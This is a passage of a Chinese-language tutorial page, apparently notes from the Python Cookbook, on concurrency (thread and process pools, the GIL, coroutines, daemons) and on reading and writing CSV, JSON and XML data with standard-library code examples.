ThreadPoolExecutor 类可以被用来完成这个 任务。 如果你想手动创建你自己的线程池，通常可以使用一个 Queue 来轻松实现. 但使用 ThreadPoolExecutor 相对于手动实现的一个好处在于它使得任务提交者更 方便的从被调用函数中获取返回值。 注意a.result() 操作会阻塞进程直到对应的函数执行完成并返回一个结果。 讨论 通常来讲，你应该避免编写线程数量可以无限制增长的程序. 以抵御有人试图通过创建大量线程让你服务器资 源枯竭而崩溃的攻击行为。通过使用预先初始化的线程池，你可以设置同时运行线程的 上限数量。 你可能会关心创建大量线程会有什么后果。现代操作系统可以很轻松的创建几千 个线程的线程池。甚至，同时几千个线程等待工作并不会对其他代码产生性能影响。当 然了，如果所有线程同时被唤醒并立即在 CPU 上执行，那就不同了——特别是有了全 局解释器锁 GIL。通常，你应该只在 I/O 处理相关代码中使用线程池。 创建大的线程池的一个可能需要关注的问题是内存的使用。例如，如果你在 OS X 系统上面创建 2000 个线程，系统显示 Python 进程使用了超过 9GB 的虚拟内存。不 过，这个计算通常是有误差的。当创建一个线程时，操作系统会预留一个虚拟内存区域 来放置线程的执行栈（通常是 8MB 大小）。但是这个内存只有一小片段被实际映射到 真实内存中。因此，Python 进程使用到的真实内存其实很小（比如，对于 2000 个线程 来讲，只使用到了 70MB 的真实内存，而不是 9GB）。如果你担心虚拟内存大小，可以 使用 threading.stack_size() 函数来降低它: import threading threading.stack_size(65536) 如果你加上这条语句并再次运行前面的创建 2000 个线程试验，你会发现 Python 进程只使用到了大概 210MB 的虚拟内存，而真实内存使用量没有变。注意线程栈大小 必须至少为 32768 字节，通常是系统内存页大小（4096、8192 等）的整数倍。 简单的并行编程 问题 你有个程序要执行 CPU 密集型工作，你想让他利用多核 CPU 的优势来运行的快 一点。 解决方案 concurrent.futures 库提供了一个 ProcessPoolExecutor 类，可被用来在一个单 独的 Python 解释器中执行计算密集型函数。不过，要使用它，你首先要有一些计算密 集型的任务。 讨论 ProcessPoolExecutor 的典型用法如下: from concurrent.futures import ProcessPoolExecutor with ProcessPoolExecutor() as pool: ... do work in parallel using pool ... 其原理是，一个 ProcessPoolExecutor 创建 N 个独立的 Python 解释器，N 是系 统上面可用 CPU 的个数。你可以通过提供可选参数给 ProcessPoolExecutor(N) 来修 改处理器数量。这个处理池会一直运行到 with 块中最后一个语句执行完成，然后处理 池被关闭。不过，程序会一直等待直到所有提交的工作被处理完成。 被提交到池中的工作必须被定义为一个函数。有两种方法去提交。如果你想让一个 列表推导或一个 map() 操作并行执行的话，可使用 pool.map() 另外，你可以使用 pool.submit() 来手动的提交单个任务 如果你手动提交一个任务，结果是一个 Future 实例。要获取最终结果，你需要调 用它的 result() 方法。它会阻塞进程直到结果被返回来。 如果不想阻塞，你还可以使用一个回调函数: def when_done(r): print('Got:', r.result()) future_result = pool.submit(work, arg) future_result.add_done_callback(when_done) 回调函数接受一个 Future 实例，被用来获取最终的结果（比如通过调用它的 result() 方法）。尽管处理池很容易使用，在设计大程序的时候还是有很多需要注意的 地方，如下几点： · 这种并行处理技术只适用于那些可以被分解为互相独立部分的问题。 · 被提交的任务必须是简单函数形式。对于方法、闭包和其他类型的并行执行还不 支持。 · 函数参数和返回值必须兼容 pickle，因为要使用到进程间的通信，所有解释器之 间的交换数据必须被序列化 · 被提交的任务函数不应保留状态或有副作用。除了打印日志之类简单的事情， 一旦启动你不能控制子进程的任何行为，因此最好保持简单和纯洁——函数不要 去修改环境。 在 Unix 上进程池通过调用 fork() 系统调用被创建， 它会克隆 Python 解释器，包括 fork 时的所有程序状态。而在 Windows 上，克隆解 释器时不会克隆状态。实际的 fork 操作会在第一次调用 pool.map() 或 pool.submit() 后发生。 当你混合使用进程池和多线程的时候要特别小心。 你应该在创建任何线程之前先创建并激活进程池（比如在程序启动的 main 线程中 创建进程池）。 Python 的全局锁问题 问题 你已经听说过全局解释器锁 GIL，担心它会影响到多线程程序的执行性能。 解决方案 尽管 Python 完全支持多线程编程，但是解释器的 C 语言实现部分在完全并行执 行时并不是线程安全的。实际上，解释器被一个全局解释器锁保护着，它确保任何时候 都只有一个 Python 线程执行。GIL 最大的问题就是 Python 的多线程程序并不能利用 多核 CPU 的优势（比如一个使用了多个线程的计算密集型程序只会在一个单 CPU 上 面运行）。 在讨论普通的 GIL 之前，有一点要强调的是 GIL 只会影响到那些严重依赖 CPU 的程序（比如计算型的）。如果你的程序大部分只会涉及到 I/O，比如网络交互，那么 使用多线程就很合适，因为它们大部分时间都在等待。实际上，你完全可以放心的创建 几千个 Python 线程，现代操作系统运行这么多线程没有任何压力，没啥可担心的。 而对于依赖 CPU 的程序，你需要弄清楚执行的计算的特点。例如，优化底层算法 要比使用多线程运行快得多。类似的，由于 Python 是解释执行的，如果你将那些性能 瓶颈代码移到一个 C 语言扩展模块中，速度也会提升的很快。如果你要操作数组，那 么使用 NumPy 这样的扩展会非常的高效。最后，你还可以考虑下其他可选实现方案， 比如 PyPy，它通过一个 JIT 编译器来优化执行效率（不过在写这本书的时候它还不能 支持 Python 3）。 还有一点要注意的是，线程不是专门用来优化性能的。一个 CPU 依赖型程序可能 会使用线程来管理一个图形用户界面、一个网络连接或其他服务。这时候，GIL 会产生 一些问题，因为如果一个线程长期持有 GIL 的话会导致其他非 CPU 型线程一直等待。 事实上，一个写的不好的 C 语言扩展会导致这个问题更加严重，尽管代码的计算部分 会比之前运行的更快些。 说了这么多，现在想说的是我们有两种策略来解决 GIL 的缺点。首先，如果你完 全工作于 Python 环境中，你可以使用 multiprocessing 模块来创建一个进程池，并 像协同处理器一样的使用它。使用一个技巧利用进程池解决了 GIL 的问题。当一个线程想要执行 CPU 密集型工作时，会将任务发给进程池。然后进程池会在另外一个进程中启动一个单独的 Python 解释器来工作。当线程等待结果的时候会释放 GIL。并且，由于计算任务在单 独解释器中执行，那么就不会受限于 GIL 了。在一个多核系统上面，你会发现这个技 术可以让你很好的利用多 CPU 的优势。 另外一个解决 GIL 的策略是使用 C 扩展编程技术。主要思想是将计算密集型任务 转移给 C，跟 Python 独立，在工作的时候在 C 代码中释放 GIL。这可以通过在 C 代 码中插入下面这样的特殊宏来完成: #include \"Python.h\" ... PyObject *pyfunc(PyObject *self, PyObject *args) { ... Py_BEGIN_ALLOW_THREADS // Threaded C code ... Py_END_ALLOW_THREADS ... } 如果你使用其他工具访问 C 语言，比如对于 Cython 的 ctypes 库，你不需要做任 何事。例如，ctypes 在调用 C 时会自动释放 GIL。 讨论 许多程序员在面对线程性能问题的时候，马上就会怪罪 GIL，什么都是它的问题。 其实这样子太不厚道也太天真了点。作为一个真实的例子，在多线程的网络编程中神秘 的 stalls 可能是因为其他原因比如一个 DNS 查找延时，而跟 GIL 毫无关系。最后你 真的需要先去搞懂你的代码是否真的被 GIL 影响到。同时还要明白 GIL 大部分都应该 只关注 CPU 的处理而不是 I/O. 如果你准备使用一个处理器池，注意的是这样做涉及到数据序列化和在不同 Python 解释器通信。被执行的操作需要放在一个通过 def 语句定义的 Python 函数中， 不能是 lambda、闭包可调用实例等，并且函数参数和返回值必须要兼容 pickle。同样， 要执行的任务量必须足够大以弥补额外的通信开销。 另外一个难点是当混合使用线程和进程池的时候会让你很头疼。如果你要同时使 用两者，最好在程序启动时，创建任何线程之前先创建一个单例的进程池。然后线程使 用同样的进程池来进行它们的计算密集型工作。 C 扩展最重要的特征是它们和 Python 解释器是保持独立的。也就是说，如果你准 备将 Python 中的任务分配到 C 中去执行，你需要确保 C 代码的操作跟 Python 保持 独立，这就意味着不要使用 Python 数据结构以及不要调用 Python 的 C API。另外一 个就是你要确保 C 扩展所做的工作是足够的，值得你这样做。也就是说 C 扩展担负起 了大量的计算任务，而不是少数几个计算。 这些解决 GIL 的方案并不能适用于所有问题。例如，某些类型的应用程序如果被 分解为多个进程处理的话并不能很好的工作，也不能将它的部分代码改成 C 语言执行。 对于这些应用程序，你就要自己需求解决方案了（比如多进程访问共享内存区，多解析 器运行于同一个进程等）。或者，你还可以考虑下其他的解释器实现，比如 PyPy。 定义一个 Actor 任务 问题 你想定义跟 actor 模式中类似\"actors\"角色的任务 解决方案 actor 模式是一种最古老的也是最简单的并行和分布式计算解决方案。事实上，它 天生的简单性是它如此受欢迎的重要原因之一。简单来讲，一个 actor 就是一个并发执 行的任务，只是简单的执行发送给它的消息任务。响应这些消息时，它可能还会给其他 actor 发送更进一步的消息。actor 之间的通信是单向和异步的。因此，消息发送者不知 道消息是什么时候被发送，也不会接收到一个消息已被处理的回应或通知。 讨论 actor 模式的魅力就在于它的简单性。 实现消息发布/订阅模型 问题 你有一个基于线程通信的程序，想让它们实现发布/订阅模式的消息通信 解决方案 要实现发布/订阅的消息通信模式，你通常要引入一个单独的\"交换机\"或\"网关\" 对象作为所有消息的中介。也就是说，不直接将消息从一个任务发送到另一个，而是将 其发送给交换机，然后由交换机将它发送给一个或多个被关联任务。 讨论 通过队列发送消息的任务或线程的模式很容易被实现并且也非常普遍。不过，使用 发布/订阅模式的好处更加明显。 首先，使用一个交换机可以简化大部分涉及到线程通信的工作。无需去写通过多进 程模块来操作多个线程，你只需要使用这个交换机来连接它们。某种程度上，这个就跟 日志模块的工作原理类似。实际上，它可以轻松的解耦程序中多个任务。 其次，交换机广播消息给多个订阅者的能力带来了一个全新的通信模式。例如，你 可以使用多任务系统、广播或扇出。你还可以通过以普通订阅者身份绑定来构建调试和 诊断工具。 关于交换机的一个可能问题是对于订阅者的正确绑定和解绑。为了正确的管理资 源，每一个绑定的订阅者必须最终要解绑。 如: exc = get_exchange('name') exc.attach(some_task) try: ... finally: exc.detach(some_task) 某种意义上，这个和使用文件、锁和类似对象很像。通常很容易会忘记最后的 detach() 步骤。为了简化这个，你可以考虑使用上下文管理器协议。 最后还应该注意的是关于交换机的思想有很多种的扩展实现。例如，交换机可以实 现一整个消息通道集合或提供交换机名称的模式匹配规则。交换机还可以被扩展到分 布式计算程序中（比如，将消息路由到不同机器上面的任务中去）。 使用生成器代替线程 问题 你想使用生成器（协程）替代系统线程来实现并发。这个有时又被称为用户级线程 或绿色线程。 解决方案 要使用生成器实现自己的并发，你首先要对生成器函数和 yield 语句有深刻理解。 yield 语句会让一个生成器挂起它的执行，这样就可以编写一个调度器，将生成器当做 某种\"任务\"并使用任务协作切换来替换它们的执行。 讨论 在构建基于生成器的并发框架时，通常会使用更常见的 yield 形式: def some_generator(): ... result = yield data ... 使用这种形式的 yield 语句的函数通常被称为\"协程\"。通过调度器，yield 语句在 一个循环中被处理，如下: f = some_generator() # Initial result. Is None to start since nothing has been computed result = None while True: try: data = f.send(result) result = ... do some calculation ... except StopIteration: break yield from 语句被用来实现协程，可以被其它生成器作为 子程序或过程来调用。本质上就是将控制权透明的传输给新的函数。不像普通的生成 器，一个使用 yield from 被调用的函数可以返回一个作为 yield from 语句结果的值。 如果使用生成器编程，要提醒你的是它还是有很多缺点的。特别是，你得不 到任何线程可以提供的好处。例如，如果你执行 CPU 依赖或 I/O 阻塞程序，它会将整 个任务挂起知道操作完成。为了解决这个问题，你只能选择将操作委派给另外一个可以 独立运行的线程或进程。另外一个限制是大部分 Python 库并不能很好的兼容基于生成 器的线程。如果你选择这个方案，你会发现你需要自己改写很多标准库函数。 多个线程队列轮询 问题 你有一个线程队列集合，想为到来的元素轮询它们，就跟你为一个客户端请求去轮 询一个网络连接集合的方式一样。 解决方案 对于轮询问题的一个常见解决方案中有个很少有人知道的技巧，包含了一个隐藏 的回路网络连接。本质上讲其思想就是：对于每个你想要轮询的队列，你创建一对连接 的套接字。然后你在其中一个套接字上面编写代码来标识存在的数据，另外一个套接字 被传给 select() 或类似的一个轮询数据到达的函数: # Compatibility on non-POSIX systems server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind(('127.0.0.1', 0)) server.listen(1) self._putsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self._putsocket.connect(server.getsockname()) self._getsocket, _ = server.accept() server.close() 讨论 对于轮询非类文件对象，比如队列通常都是比较棘手的问题。例如，如果你不使用 上面的套接字技术，你唯一的选择就是编写代码来循环遍历这些队列并使用一个定时 器。 这样做其实不合理，还会引入其他的性能问题。例如，如果新的数据被加入到一个 队列中，至少要花 sleep的时间 才能被发现。如果你之前的轮询还要去轮询其他对象，比如 网络套接字那还会有更多问题。 在 Unix 系统上面启动守护进程 问题 你想编写一个作为一个在 Unix 或类 Unix 系统上面运行的守护进程运行的程序 解决方案 创建一个正确的守护进程需要一个精确的系统调用序列以及对于细节的控制。 创建一个守护进程的步骤看上去不是很易懂，但是大体思想是这样的，首先，一个 守护进程必须要从父进程中脱离。这是由 os.fork() 操作来完成的，并立即被父进程 终止。 在子进程变成孤儿后，调用 os.setsid() 创建了一个全新的进程会话，并设置子 进程为首领。它会设置这个子进程为新的进程组的首领，并确保不会再有控制终端。如 果这些听上去太魔幻，因为它需要将守护进程同终端分离开并确保信号机制对它不起 作用。调用 os.chdir() 和 os.umask(0) 改变了当前工作目录并重置文件权限掩码。修 改目录通常是个好主意，因为这样可以使得它不再工作在被启动时的目录。 另外一个调用 os.fork() 在这里更加神秘点。这一步使得守护进程失去了获取新 的控制终端的能力并且让它更加独立（本质上，该 daemon 放弃了它的会话首领低位， 因此再也没有权限去打开控制终端了）。尽管你可以忽略这一步，但是最好不要这么做。 一旦守护进程被正确的分离，它会重新初始化标准 I/O 流指向用户指定的文件。 这一部分有点难懂。跟标准 I/O 流相关的文件对象的引用在解释器中多个地方被找到 （sys.stdout, sys.__stdout__ 等）。仅仅简单的关闭 sys.stdout 并重新指定它是行不 通的，因为没办法知道它是否全部都是用的是 sys.stdout 。这里，我们打开了一个单 独的文件对象，并调用 os.dup2() ，用它来代替被 sys.stdout 使用的文件描述符。这 样，sys.stdout 使用的原始文件会被关闭并由新的来替换。还要强调的是任何用于文 件编码或文本处理的标准 I/O 流还会保留原状。 守护进程的一个通常实践是在一个文件中写入进程 ID，可以被其他程序后面使用 到。daemonize() 函数的最后部分写了这个文件，但是在程序终止时删除了它。atexit. register() 函数注册了一个函数在 Python 解释器终止时执行。一个对于 SIGTERM 的 信号处理器的定义同样需要被优雅的关闭。信号处理器简单的抛出了 SystemExit() 异 常。或许这一步看上去没必要，但是没有它，终止信号会使得不执行 atexit.register() 注册的清理操作的时候就杀掉了解释器。一个杀掉进程的例子代码可以在程序最后的 stop 命令的操作中看到。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Concurrent-programming.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Concurrent-programming.html"},{"title":"数据编码和处理","text":"主要讨论使用 Python 处理各种不同方式编码的数据，比如 CSV 文件， JSON，XML 和二进制包装记录。 不讨论特殊的算 法问题，而是关注于怎样获取和存储这些格式的数据。 读写 CSV 数据 对于大多数的 CSV 格式的数据读写问题，都可以使用 csv 库。例如:假设你在一 个名叫 stocks.csv 文件中有一些股票市场数据，就像这样: Symbol,Price,Date,Time,Change,Volume \"AA\",39.48,\"6/11/2007\",\"9:36am\",-0.18,181800 \"AIG\",71.38,\"6/11/2007\",\"9:36am\",-0.15,195500 \"AXP\",62.58,\"6/11/2007\",\"9:36am\",-0.46,935000 \"BA\",98.31,\"6/11/2007\",\"9:36am\",+0.12,104800 \"C\",53.08,\"6/11/2007\",\"9:36am\",-0.25,360900 \"CAT\",78.29,\"6/11/2007\",\"9:36am\",-0.23,225400 如何将这些数据读取为一个元组的序列: import csv with open('stocks.csv') as f: f_csv = csv.reader(f) headers = next(f_csv) for row in f_csv: # Process row ... 在上面的代码中，row 会是一个列表。因此，为了访问某个字段，你需要使用下标， 如 row[0] 访问 Symbol，row[4] 访问 Change。 由于这种下标访问通常会引起混淆，你可以考虑使用命名元组。例如: from collections import namedtuple with open('stock.csv') as f: f_csv = csv.reader(f) headings = next(f_csv) Row = namedtuple('Row', headings) for r in f_csv: row = Row(*r) # Process row ... 它允许你使用列名如 row.Symbol 和 row.Change 代替下标访问。 需要注意的是这 个只有在列名是合法的 Python 标识符的时候才生效。 如果不是的话，你可能需要修改 下原始的列名 (如将非标识符字符替换成下划线之类的)。 另外一个选择就是将数据读取到一个字典序列中去。可以这样做: import csv with open('stocks.csv') as f: f_csv = csv.DictReader(f) for row in f_csv: # process row ... 在这个版本中，你可以使用列名去访问每一行的数据了。比如，row['Symbol'] 或 者 row['Change'] 为了写入 CSV 数据，你仍然可以使用 csv 模块，不过这时候先创建一个 writer 对象: headers = ['Symbol','Price','Date','Time','Change','Volume'] rows = [('AA', 39.48, '6/11/2007', '9:36am', -0.18, 181800), ('AIG', 71.38, '6/11/2007', '9:36am', -0.15, 195500), ('AXP', 62.58, '6/11/2007', '9:36am', -0.46, 935000), ] with open('stocks.csv','w') as f: f_csv = csv.writer(f) f_csv.writerow(headers) f_csv.writerows(rows) 如果你有一个字典序列的数据，可以像这样做: headers = ['Symbol', 'Price', 'Date', 'Time', 'Change', 'Volume'] rows = [{'Symbol':'AA', 'Price':39.48, 'Date':'6/11/2007', 'Time':'9:36am', 'Change':-0.18, 'Volume':181800}, {'Symbol':'AIG', 'Price': 71.38, 'Date':'6/11/2007', 'Time':'9:36am', 'Change':-0.15, 'Volume': 195500}, {'Symbol':'AXP', 'Price': 62.58, 'Date':'6/11/2007', 'Time':'9:36am', 'Change':-0.46, 'Volume': 935000}, ] with open('stocks.csv','w') as f: f_csv = csv.DictWriter(f, headers) f_csv.writeheader() f_csv.writerows(rows) 你应该总是优先选择 csv 模块分割或解析 CSV 数据。例如，你可能会像编写类似 下面这样的代码: with open('stocks.csv') as f: for line in f: row = line.split(',') # process row ... 使用这种方式的一个缺点就是你仍然需要去处理一些棘手的细节问题。 比如，如果 某些字段值被引号包围，你不得不去除这些引号。 另外，如果一个被引号包围的字段碰 巧含有一个逗号，那么程序就会因为产生一个错误大小的行而出错。 默认情况下，csv 库可识别 Microsoft Excel 所使用的 CSV 编码规则。这或许也是 最常见的形式，并且也会给你带来最好的兼容性。 然而，如果你查看 csv 的文档，就会 发现有很多种方法将它应用到其他编码格式上 (如修改分割字符等)。 例如，如果你想 读取以 tab 分割的数据，可以这样做: # Example of reading tab-separated values with open('stock.tsv') as f: f_tsv = csv.reader(f, delimiter='\\t') for row in f_tsv: # Process row ... 如果你正在读取 CSV 数据并将它们转换为命名元组，需要注意对列名进行合法性 认证。 例如，一个 CSV 格式文件有一个包含非法标识符的列头行，类似下面这样: Street Address,Num-Premises,Latitude,Longitude 5412 N CLARK,10,41.980262,-87.668452 这样最终会导致在创建一个命名元组时产生一个 ValueError 异常而失败。为了解 决这问题，你可能不得不先去修正列标题。 例如，可以像下面这样在非法标识符上使用 一个正则表达式替换: import re with open('stock.csv') as f: f_csv = csv.reader(f) headers = [ re.sub('[&#94;a-zA-Z_]', '_', h) for h in next(f_csv) ] Row = namedtuple('Row', headers) for r in f_csv: row = Row(*r) # Process row ... 还有重要的一点需要强调的是，csv 产生的数据都是字符串类型的，它不会做任何 其他类型的转换。 如果你需要做这样的类型转换，你必须自己手动去实现。 下面是一个 在 CSV 数据上执行其他类型转换的例子: col_types = [str, float, str, str, float, int] with open('stocks.csv') as f: f_csv = csv.reader(f) headers = next(f_csv) for row in f_csv: # Apply conversions to the row items row = tuple(convert(value) for convert, value in zip(col_types, row)) ... 另外，下面是一个转换字典中特定字段的例子: print('Reading as dicts with type conversion') field_types = [ ('Price', float), ('Change', float), ('Volume', int) ] with open('stocks.csv') as f: for row in csv.DictReader(f): row.update((key, conversion(row[key])) for key, conversion in field_types) print(row) 通常来讲，你可能并不想过多去考虑这些转换问题。 在实际情况中，CSV 文件都 或多或少有些缺失的数据，被破坏的数据以及其它一些让转换失败的问题。 因此，除非 你的数据确实有保障是准确无误的，否则你必须考虑这些问题 (你可能需要增加合适的 错误处理机制)。 最后，如果你读取 CSV 数据的目的是做数据分析和统计的话，你可能需要看一看 Pandas 包。 Pandas 包含了一个非常方便的函数叫 pandas.read_csv() ，它可以加载 CSV 数据到一个 DataFrame 对象中去。 然后利用这个对象你就可以生成各种形式的统 计、过滤数据以及执行其他高级操作了。 读写 JSON 数据 读写 JSON(JavaScript Object Notation) 编码格式的数据。 json 模块提供了一种很简单的方式来编码和解码 JSON 数据。 其中两个主要的函 数是 json.dumps() 和 json.loads() ，要比其他序列化函数库如 pickle 的接口少得多。 下面演示如何将一个 Python 数据结构转换为 JSON: import json data = { 'name' : 'ACME', 'shares' : 100, 'price' : 542.23 } json_str = json.dumps(data) 将一个 JSON 编码的字符串转换回一个 Python 数据结构: data = json.loads(json_str) 如果你要处理的是文件而不是字符串，你可以使用 json.dump() 和 json.load() 来编码和解码 JSON 数据 JSON 编码支持的基本数据类型为 None ，bool ，int ，float 和 str ， 以及包含 这些类型数据的 lists，tuples 和 dictionaries。 对于 dictionaries，keys 需要是字符串类 型 (字典中任何非字符串类型的 key 在编码时会先转换为字符串)。 为了遵循 JSON 规 范，你应该只编码 Python 的 lists 和 dictionaries。 而且，在 web 应用程序中，顶层对 象被编码为一个字典是一个标准做法。 JSON 编码的格式对于 Python 语法而已几乎是完全一样的，除了一些小的差异之 外。 比如，True 会被映射为 true，False 被映射为 false，而 None 会被映射为 null。 下 面是一个例子，演示了编码后的字符串效果: >>> json.dumps(False) 'false' >>> d = {'a': True, ... 'b': 'Hello', ... 'c': None} >>> json.dumps(d) '{\"b\": \"Hello\", \"c\": null, \"a\": true}' >>> 如果你试着去检查 JSON 解码后的数据，你通常很难通过简单的打印来确定它 的结构， 特别是当数据的嵌套结构层次很深或者包含大量的字段时。 为了解决这个问 题，可以考虑使用 pprint 模块的 pprint() 函数来代替普通的 print() 函数。 它会按 照 key 的字母顺序并以一种更加美观的方式输出。 下面是一个演示如何漂亮的打印输 出 Twitter 上搜索结果的例子: >>> from urllib.request import urlopen >>> import json >>> u = urlopen('http://search.twitter.com/search.json?q=python&rpp=5') >>> resp = json.loads(u.read().decode('utf-8')) >>> from pprint import pprint >>> pprint(resp) {'completed_in': 0.074, 'max_id': 264043230692245504, 'max_id_str': '264043230692245504', 'next_page': '?page=2&max_id=264043230692245504&q=python&rpp=5', 'page': 1, 'query': 'python', 'refresh_url': '?since_id=264043230692245504&q=python', 'results': [{'created_at': 'Thu, 01 Nov 2012 16:36:26 +0000', 'from_user': ... }, {'created_at': 'Thu, 01 Nov 2012 16:36:14 +0000', 'from_user': ... }, {'created_at': 'Thu, 01 Nov 2012 16:36:13 +0000', 'from_user': ... }, {'created_at': 'Thu, 01 Nov 2012 16:36:07 +0000', 'from_user': ... } {'created_at': 'Thu, 01 Nov 2012 16:36:04 +0000', 'from_user': ... }], 'results_per_page': 5, 'since_id': 0, 'since_id_str': '0'} >>> 一般来讲，JSON 解码会根据提供的数据创建 dicts 或 lists。 如果你想要创建其他 类型的对象，可以给 json.loads() 传递 object_pairs_hook 或 object_hook 参数。 例 如，下面是演示如何解码 JSON 数据并在一个 OrderedDict 中保留其顺序的例子: >>> s = '{\"name\": \"ACME\", \"shares\": 50, \"price\": 490.1}' >>> from collections import OrderedDict >>> data = json.loads(s, object_pairs_hook=OrderedDict) >>> data OrderedDict([('name', 'ACME'), ('shares', 50), ('price', 490.1)]) >>> 下面是如何将一个 JSON 字典转换为一个 Python 对象例子: >>> class JSONObject: ... def __init__(self, d): ... self.__dict__ = d ... >>> >>> data = json.loads(s, object_hook=JSONObject) >>> data.name 'ACME' >>> data.shares 50 >>> data.price 490.1 >>> JSON 解码后的字典作为一个单个参数传递给 __init__() 。 然 后，你就可以随心所欲的使用它了，比如作为一个实例字典来直接使用它。 如果你想获得漂亮的格式化字符串 后输出，可以使用 json.dumps() 的 indent 参数。 对象实例通常并不是 JSON 可序列化的。 如果你想序列化对象实例，你可以提供一个函数，它的输入是一个实例，返回一个 可序列化的字典。例如: def serialize_instance(obj): d = { '__classname__' : type(obj).__name__ } d.update(vars(obj)) return d 如果你想反过来获取这个实例，可以这样做: # Dictionary mapping names to known classes classes = { 'Point' : Point } def unserialize_object(d): clsname = d.pop('__classname__', None) if clsname: cls = classes[clsname] obj = cls.__new__(cls) # Make instance without calling __init__ for key, value in d.items(): setattr(obj, key, value) return obj else: return d 如何使用这些函数: >>> p = Point(2,3) >>> s = json.dumps(p, default=serialize_instance) >>> s '{\"__classname__\": \"Point\", \"y\": 3, \"x\": 2}' >>> a = json.loads(s, object_hook=unserialize_object) >>> a <__main__.Point object at 0x1017577d0> >>> a.x 2 >>> a.y 3 >>> 解析简单的 XML 数据 可以使用 xml.etree.ElementTree 模块从简单的 XML 文档中提取数据。 为了演 示，假设你想解析 Planet Python 上的 RSS 源。下面是相应的代码: from urllib.request import urlopen from xml.etree.ElementTree import parse # Download the RSS feed and parse it u = urlopen('http://planet.python.org/rss20.xml') doc = parse(u) # Extract and output tags of interest for item in doc.iterfind('channel/item'): title = item.findtext('title') date = item.findtext('pubDate') link = item.findtext('link') print(title) print(date) print(link) print() xml.etree.ElementTree.parse() 函数解析整个 XML 文档并将其转换成一个文 档对象。 然后，你就能使用 find() 、iterfind() 和 findtext() 等方法来搜索特定的 XML 元素了。 这些函数的参数就是某个指定的标签名， 例如 channel/item 或 title 。 channel/item 表示 <channel> 标签下的 <item> 标签 title 表示 <title> 标签 ElementTree 模块中的每个元素有一些重要的属性和方法，在解析的时候非常有 用。 tag 属性包含了标签的名字，text 属性包含了内部的文本，而 get() 方法能获取 属性值。例如: >>> doc <xml.etree.ElementTree.ElementTree object at 0x101339510> >>> e = doc.find('channel/title') >>> e <Element 'title' at 0x10135b310> >>> e.tag 'title' >>> e.text 'Planet Python' >>> e.get('some_attribute') >>> 有一点要强调的是 xml.etree.ElementTree 并不是 XML 解析的唯一方法。 对于 更高级的应用程序，你需要考虑使用 lxml 。 它使用了和 ElementTree 同样的编程接 口，因此上面的例子同样也适用于 lxml。 你只需要将刚开始的 import 语句换成 from lxml.etree import parse 就行了。 lxml 完全遵循 XML 标准，并且速度也非常快，同 时还支持验证，XSLT，和 XPath 等特性。 增量式解析大型 XML 文件 用尽可能少的内存从一个超大的 XML 文档中提取数据 任何时候只要你遇到增量式的数据处理时，第一时间就应该想到迭代器和生成器。 下面是一个很简单的函数，只使用很少的内存就能增量式的处理一个大型 XML 文件: def parse_and_remove(filename, path): path_parts = path.split('/') doc = iterparse(filename, ('start', 'end')) # Skip the root element next(doc) tag_stack = [] elem_stack = [] for event, elem in doc: if event == 'start': tag_stack.append(elem.tag) elem_stack.append(elem) elif event == 'end': if tag_stack == path_parts: yield elem elem_stack[-2].remove(elem) try: tag_stack.pop() elem_stack.pop() except IndexError: pass 依赖 ElementTree 模块中的两个核心功能。 第一，iterparse() 方 法允许对 XML 文档进行增量操作。 使用时，你需要提供文件名和一个包含下面一种或 多种类型的事件列表:start , end, start-ns 和 end-ns 。 由 iterparse() 创建的迭 代器会产生形如 (event, elem) 的元组， 其中 event 是上述事件列表中的某一个，而 elem 是相应的 XML 元素。例如: >>> data = iterparse('potholes.xml',('start','end')) >>> next(data) ('start', <Element 'response' at 0x100771d60>) >>> next(data) ('start', <Element 'row' at 0x100771e68>) >>> next(data) ('start', <Element 'row' at 0x100771fc8>) >>> next(data) ('start', <Element 'creation_date' at 0x100771f18>) >>> next(data) ('end', <Element 'creation_date' at 0x100771f18>) >>> next(data) ('start', <Element 'status' at 0x1006a7f18>) >>> next(data) ('end', <Element 'status' at 0x1006a7f18>) >>> start 事件在某个元素第一次被创建并且还没有被插入其他数据 (如子元素) 时被 创建。而 end 事件在某个元素已经完成时被创建. 尽管没有在例子中演示，start-ns 和 end-ns 事件被用来处理 XML 文档命名空间的声明。 将字典转换为 XML 使用一个 Python 字典存储数据，并将它转换成 XML 格式。 尽管 xml.etree.ElementTree 库通常用来做解析工作，其实它也可以创建 XML 文档。例如，考虑如下这个函数: from xml.etree.ElementTree import Element def dict_to_xml(tag, d): ''' Turn a simple dict of key/value pairs into XML ''' elem = Element(tag) for key, val in d.items(): child = Element(key) child.text = str(val) elem.append(child) return elem 使用: >>> s = { 'name': 'GOOG', 'shares': 100, 'price':490.1 } >>> e = dict_to_xml('stock', s) >>> e <Element 'stock' at 0x1004b64c8> >>> 转换结果是一个 Element 实例。 对于 I/O 操作，使用 xml.etree.ElementTree 中 的 tostring() 函数很容易就能将它转换成一个字节字符串。例如: >>> from xml.etree.ElementTree import tostring >>> tostring(e) b'<stock><price>490.1</price><shares>100</shares><name>GOOG</name></stock>' >>> 如果你想给某个元素添加属性值，可以使用 set() 方法: >>> e.set('_id','1234') >>> tostring(e) b'<stock _id=\"1234\"><price>490.1</price><shares>100</shares><name>GOOG</name> </stock>' >>> 如果你还想保持元素的顺序，可以考虑构造一个 OrderedDict 来代替一个普通的 字典. 当创建 XML 的时候，你被限制只能构造字符串类型的值。 问题是如果你手动的去构造的时候可能会碰到一些麻烦。例如，当字典的值中包含 一些特殊字符的时候会怎样呢?: >>> d = { 'name' : '<spam>' } >>> # String creation >>> dict_to_xml_str('item',d) '<item><name><spam></name></item>' >>> # Proper XML creation >>> e = dict_to_xml('item',d) >>> tostring(e) b'<item><name>&lt;spam&gt;</name></item>' >>> 注意到程序的后面那个例子中，字符‘<'和‘>'被替换成了 &lt; 和 &gt; 下面仅供参考，如果你需要手动去转换这些字符，可以使用 xml.sax.saxutils 中 的 escape() 和 unescape() 函数。例如: >>> from xml.sax.saxutils import escape, unescape >>> escape('<spam>') '&lt;spam&gt;' >>> unescape(_) '<spam>' >>> 解析和修改 XML 读取一个 XML 文档，对它最一些修改，然后将结果写回 XML 文档。 数据文件 pred.xml: <?xml version=\"1.0\"?> <stop> <id>14791</id> <nm>Clark &amp; Balmoral</nm> <sri> <rt>22</rt> <d>North Bound</d> <dd>North Bound</dd> </sri> <cr>22</cr> <pre> <pt>5 MIN</pt> <fd>Howard</fd> <v>1378</v> <rn>22</rn> </pre> <pre> <pt>15 MIN</pt> 